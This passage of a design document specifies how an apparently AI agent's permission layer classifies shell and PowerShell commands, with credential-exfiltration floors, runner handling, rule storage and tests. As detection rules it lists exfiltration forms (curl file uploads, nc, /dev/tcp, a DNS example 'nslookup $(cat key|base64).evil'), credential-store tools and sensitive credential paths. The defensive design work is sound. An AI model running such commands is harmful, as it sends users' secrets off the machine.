Hidden code alone adds no `ordinaryAsk`. Without explicit restrictions, credential/sink evidence, opaque bindings or retained file-execution provenance, statically bound direct interpreter forms such as `python -c`, `perl -e`, `node -e`, `node x.js`, `python x.py`, `bash -c ls` and `pwsh -c Get-Date` follow the actual-route shell decision order above. Their rule-visibility limits do not prove that their contents are read-only.

An opaque runner prefix alone is not hidden code for rule matching. Runner
argv remains available to raw command rules regardless of task or subcommand
spelling. That visibility does not inspect package or script contents. Option
spelling does not add a hidden-code blocker; rule coverage still requires
matching static argv and the shared broad-prefix check. The inner command is not a
transparent alias.

### Scoped rule storage

`Edit`, `WebFetch` and `Mcp` use the existing validated global and project rule files. Malformed rules fail the whole file closed; no second store or conversion of exact approvals is introduced. Their subjects are built from host-created file/fetch instances or the registered MCP adapter identity rather than a tool-name resemblance.

### Shell classification buckets

Credential/sink analysis has three outcomes. An identified floor takes precedence
when the same input also has an ordinary reason. Other existing hard-deny,
destructive, explicit-ask and one-shot requirements retain their own authority.

| Bucket | Signal | Decision without another controlling rule |
|---|---|---|
| Floor | Sensitive/credential paths or retained credential-store, certificate-export and transport/sink catalogue effects | Per-call ask with `forceModal`; no saved approval, allow rule or mode bypass |
| Ordinary | Parser refusal, analysis-budget exhaustion, opaque bindings, retained file-execution provenance, or an opaque package/code-runner prefix | `ordinaryAsk` / `ordinaryShellAsk` at layer 6; no `forceModal`; applicable rules and saved grants may cover it |
| Normal | No credential/sink floor or ordinary reason | Existing category, mode, rules and grants |

An ordinary ask remains rememberable under the existing approval-scope and risk
requirements. An unparseable command cannot match a `Bash(...)` allow rule, but
that matching limit does not turn it into a per-call floor or invalidate an
otherwise applicable tool allow rule or saved grant.

Path inspection snapshots policy roots for one decision and bounds filesystem
and glob work. Exhaustion keeps an ordinary reason and prevents a command-prefix
allow match. Remaining visible literal paths still receive lexical credential
checks, and explicit upload arguments retain their sink checks. An unresolved
alias beyond the work limit remains opaque; the scan does not claim to resolve
every filesystem alias after exhaustion.

These buckets describe the permission decision. A hard deny rejects the request
and cannot be approved; a forced per-call ask permits only that approval step.
Neither an ordinary grant nor per-call approval overrides execution-time path
authority or unsupported-syntax rejection. For example, `npx prettier .` can be
covered by an applicable runner command rule, while `source ./setup.sh` remains
rejected by the separate path-authority contract even after a permission grant.

### Retained credential and sink floors

Sensitive-path arguments to shell commands remain enforced by
`src/tools/shell-path-policy.ts` at execution, independently of rules.

**Sensitive-path floor** (`shellSensitivePathSignal`). A path from
`sensitive-paths.ts` anywhere in the command line, including argv, `=value`,
`@file`, redirections, assignments, loop lists, executed substitutions and
literal inline code, is never covered by an allow rule and forces a per-call
ask in `checkDetailed` in every mode. `~`, `~user`, `$HOME` and `${HOME}` normalize
to a home directory; other expansions (`$(echo ~)/.aws/credentials`) keep their
literal tail; brace expansion is expanded; a glob is instantiated against the
sensitive names that exist where it would expand. After the work limit, a
bounded fallback checks possible sensitive glob and brace paths without proving
filesystem existence; possible credential reach retains the floor. Plain budget
exhaustion without credential or sink evidence remains ordinary.
File-input values such as
`--env-file=.env` retain this scan; a valueless `--env-file` retains its implicit
`.env` input. These are file-input checks, not runner option policy.
The permission-manager ask does not authorize a sensitive-path operation that
the execution gate forbids.

**Credential-exfiltration floor**
(`src/permissions/rules/shell-exfiltration.ts`). A command is exfiltration when
one subcommand sends data off the machine and that data comes from a file or
secret. It covers:

- `curl`/`wget` with a file-sourced body, header or upload: `@file`, `-F x=@`,
  `-T`, `--post-file`, or any argument built from a `$(…)` that reads a path;
- `scp`/`rsync` to a remote destination, and `sftp` to a host;
- `nc`/`ncat`/`socat` fed from a file, a here-string or a path-reading pipeline
  stage;
- sensitive-path arguments to a sender;
- any argument of a network-capable program built from a `$(…)` that reads a
  path (`nslookup $(cat key|base64).evil`), except multi-purpose tools whose
  arguments routinely carry file text (`git`, `gh`, `npm`, `docker`, …);
- reader-independent: a sensitive path anywhere together with a network-capable
  program (the shared table includes `curl`, `wget`, `ssh`, `scp`, `rsync`,
  `openssl`, `nc`, `socat`, `telnet`, `nslookup`, `dig`, `gh`, `aws`, `gcloud`,
  `az`, `http` and `git`), a `/dev/tcp` or `/dev/udp` redirection, or hidden code
  anywhere in the same command line.

Senders are seen through wrappers, `busybox`, and literal `sh -c` / `eval` /
here-documents. The check applies to the whole compound command. It produces a
HIGH rule-classifier verdict, no allow-rule match, and a forced per-call ask in
`checkDetailed` in every mode. Unknown code alone does not establish a sender.
Plain GETs, form fields without `@`, local `rsync`, `scp` downloads and `git push`
do not establish this floor by themselves.

### Opaque runner prefixes

`SHELL_PREFIX_POLICY.packageRunners` is the canonical runner-identity source, including `npm`, `pnpm`, `yarn` and `bun`. `opaqueRunnerReason` returns `opaque runner prefix` through the shared `SHELL_PREFIX_POLICY.wrappers` grammar, including versioned runner spellings and supported executable/script suffixes. A runner receives an ordinary ask without an applicable rule or grant. No runner option allowlist, source classification, registry policy or package-task model assigns its bucket. An unknown option, remote package operand or registry choice alone is not a credential/sink floor.

Code-executing runners are never allow-rule-transparent wrappers. A persistent
command prefix includes the runner and proven literal command, with a literal
`--` required when options precede that command. Literal downstream
command candidates are inspected only to retain known credential, reader and
sender effects, including original substitution metadata; this inspection does
not strip runners from rule matching or infer safe argv from option spelling.
For example, `npx curl -T file http://e` retains its upload floor, while `npx curl http://e` has the ordinary runner reason unless another signal applies. Literal inline shell/code arguments still receive structural credential and sink inspection. Code visibility alone does not create an ordinary reason; unresolved command targets or code bindings do.

Known sinks remain visible through the shared wrapper grammar in `wrapperCommand` (`wrapperPrefixLength` exposes its proven argv boundary). Setup operands such as a scheduling priority, CPU mask, lockfile or root directory precede the inner command. The login `-` is a flag rather than a user operand. Explicit wrapper command strings and the entire tail passed to a default shell receive bounded shell inspection. Unsupported options and opaque bindings request ordinary approval and leave the command position uncertain. Every remaining position stays a floor-only candidate, including provisional setup operands; uncertainty never hides the tail from credential or sink inspection. Self-contained `--name=value` options retain the following command position. An independent credential or sink floor takes precedence over grants and allow rules. These sink-only views preserve native identity: a forwarded native `curl` is not a PowerShell cmdlet alias. This inspection supplies no allow-rule coverage.

The shared prefix source also marks declared interpreter/code operands. Those operands receive generic credential/sink inspection through literal delegates; their words do not become command candidates in another language. This role adds no runner-option policy or rule coverage.

### PowerShell analysis and general provenance

`src/permissions/rules/powershell-exfiltration.ts` preserves the structural
analysis and the credential/sink vocabulary. The invocation pipeline gives both
canonical host-shell tools a shell rule subject with a `dialect`; an unknown
dialect is a contract violation. The PowerShell reading includes the shared
credential/sink reading of visible text plus a PowerShell-aware pass:

- PowerShell script blocks and `pwsh`/`powershell` inline command text use this catalogue. Other interpreter code uses generic credential/sink inspection with literal text and inline readers/senders retained. A `print` expression in `python` or `perl` does not acquire the PowerShell printer-port sink meaning.
- Cmdlets and aliases include `Invoke-WebRequest`/`iwr`,
  `Invoke-RestMethod`/`irm`, and `curl`/`wget`, their aliases in Windows PowerShell
  5.1. Analysis retains parameter-name prefixes (`-InF`), `(…)`/`$(…)`/`{…}`/
  `@{…}` groups, assignments, `foreach (… in …)`, file-fed pipeline `$_`, and
  `@p` splats of a hashtable assigned in the same command.
- Senders retain `-InFile`, file-derived arguments, pipeline input bound to
  `-Body`, `Start-BitsTransfer -TransferType Upload`,
  `Send-MailMessage -Attachments`, `Copy-Item -ToSession`,
  `WebClient.UploadFile`, `.NET` upload methods given file data, other network
  cmdlets (`Resolve-DnsName`, `Test-NetConnection`, …) given file data.
  Static and opaque transport splats retain the catalogue's credential/sink floors; unresolved non-transport bindings remain ordinary. Independently visible upload arguments still receive sink inspection.
- Catalogue credential-store commands and certificate exports retain their floors, including `cmdkey`, `vaultcmd`, `Get-Secret`, `Get-StoredCredential` and `Export-PfxCertificate`. Catalogued native transfer/downloader effects remain covered, including `bitsadmin.exe`, `certutil.exe`, `certreq.exe` and `desktopimgdownldr.exe`. Known credential/sink effects remain visible in process-launcher argument payloads, executed job script blocks and background commands.
- File-data sources retain `Get-Content`/`gc`/`cat`/`type`, `Select-String`,
  `Import-Clixml`, `Get-Item`, `[IO.File]::Read*`, `Get-Secret`,
  `Get-StoredCredential`, `cmdkey`, `env:` listings, and variables assigned
  from them. Path normalization retains `$env:USERPROFILE`, `$env:HOME`,
  `${env:…}`, `$HOME`, `~\`, backslashes, backtick escapes and `FileSystem::`.
- Native switches belong to the native program. Literal local data remains data. This argument role does not prove read-only effects, grant execution or establish a runner command boundary. Opaque interpreter bindings retain an ordinary reason; statically bound direct inline or script-file code does not create one by itself. Neither proves read-only script contents. Arguments after a literal script-file operand or a modeled module retain the existing script policy.
- Local write destinations and contents have distinct bindings. Values written
  to a known local file remain data, including unresolved values and quoted
  command examples. Executed subexpressions retain their checks. Unknown
  destinations, remote shares and printer ports retain their sink inspection.
  Supported here-string escapes are decoded; unsupported escapes retain an
  ordinary reason when their role is opaque, with any identified floor taking
  precedence.
- Within one input and executed nested frames, established writes, copies,
  moves, renames, downloads and extraction retain destination paths and
  leaf/stem spellings. Later execution of a matching path or command stays an
  ordinary ask unless credentials or a sink are identified. Modeled interpreter
  test/build discovery after executable or untyped writes retains the same
  ordinary reason and document-type exemptions from
  `powershell-file-provenance.ts`. Copied catalogue executables retain their
  identity through renames, so a copied sender still receives sink analysis.
  Unknown native argv does not establish written paths. Provenance is not
  persisted across calls. An arbitrary earlier file write does not couple a
  later package task to that file or infer manifest contents.
- `Invoke-Item`/`ii` retains support for literal document/media/data types and
  explicit directory spellings. An unsuffixed literal path can be admitted when
  `statSync(...).isDirectory()` confirms a directory in the current host
  context. This metadata exception is disabled after possible filesystem
  effects and in launcher/code-probe frames; queries consume the shared budget.
  Missing extensionless paths, regular extensionless files, nonliteral values,
  expressions and splats stay ordinary unless an independent floor applies.
  Metadata does not prove future type stability or inspect file contents.
- Parser refusal and global/recursive budget exhaustion carry their specific
  ordinary reason. Existing fallback inspection retains visible credential and
  upload signals, which take precedence over that reason. Executed nested
  frames propagate ordinary asks. Literal quoted code is inspected for visible
  credentials and sinks without treating unknown code as exfiltration.

As in Bash, a token variable in a header and plain `Invoke-WebRequest` GETs,
including `-OutFile`, do not establish the exfiltration floor by themselves.
The rule classifier grades the builtin `powershell` tool with the same reading.

### Dialect-scoped rules and grants

PowerShell currently has no per-command rule language. `Bash(...)` rules match
`bash` only and a PowerShell call carries no project command-rule scope.
Existing tool allow rules and saved grants can satisfy PowerShell's ordinary
asks, including opaque runners and parser refusal; they cannot satisfy a
credential/sink floor. No `PowerShell(...)` command-rule grammar is introduced.

`sensitive-paths.ts` retains the home-anchored credential rows marked `windows`:
`AppData/Roaming|Local/Microsoft/Credentials`, `Microsoft/Protect`,
`Microsoft/Crypto`, `Microsoft/Vault`,
`AppData/Local/Microsoft/PowerShell/secretmanagement`, and
`AppData/Roaming/GitHub CLI`, plus the host-guard-only
`User Data/**/Login Data` pattern. They match case-insensitively on every
platform. Shared profile stores (`.ssh`, `.aws`, `.azure`, `.kube/config`,
`.docker/config.json`, `.git-credentials`) keep their single path rows and
anchor-free matching under `C:/Users/<name>/`.

### Egress and verification boundary

The sink catalogue remains necessary until a separate egress boundary exists.
Sandbox defaults, platform availability and network enforcement belong to the
[architecture contract](../architecture/architecture.md#os-execution-sandbox-and-plugin-workers).
This rule-model change does not introduce a proxy or delegate credential/sink
analysis to isolation. Plain-shell approval follows the decision order above. Shell URLs and remote package/registry sources alone do
not replace credential/sink evidence.

The decision-table and classifier checks establish policy-analysis behavior.
Native shell execution and proxy/sandbox egress behavior are not validated by
this change.

### Approval rules UI

Settings accepts canonical `Bash(...)` rules, including whitespace inside their command prefix. The dock saves through the same `PermissionManager.addRulePersist` method. Revocation uses `removeRulePersist` for rules and the existing Store B revoke method for exact approvals. Each row identifies its decision, source and user, project, persistent or conversation scope. Revoking an entry affects subsequent permission checks; it does not answer an open approval request. Failed saves and revocations remain visible.

## Tests

- `src/permissions/__tests__/shell-sandbox-rules.test.ts` covers actual-route auto-allow, exact-only unavailable matching, floors, deny/ask precedence, repeated native host retries, unchanged subsequent sandbox plans and reviewer escalation.
- `src/permissions/__tests__/rules-language.test.ts` covers:
  - the grammar;
  - the refused list;
  - bounded prefix suggestions and irreversible commands;
  - compound commands, substitutions, wrappers and floors;
  - the `ls *` vs `lsof` case.
- `src/permissions/__tests__/rules-store-and-decision.test.ts` covers:
  - corrupt Store A, Store B and project files;
  - precedence across scopes;
  - ask beating `allow` mode;
  - persistence across restart;
  - sibling projects;
  - Store B coexistence;
  - the default-mode gate offering "remember" for `ls` / `npm test` but not `rm -rf`.
- `src/ui/renderer/components/__tests__/ToolApprovalContent-shell-rules.test.tsx` covers rule editing, refused prefixes, session scope, durable deny, save failure and English/Korean copy.
- `src/ui/renderer/tabs/__tests__/PermissionsTab.test.tsx` covers the unified list, refresh, scoped revocation and unavailable stores.
- `test/e2e/ui/approval-shell-rules.spec.ts` covers bilingual shell controls, one-shot credential requests and project-rule revocation through the host bridge.
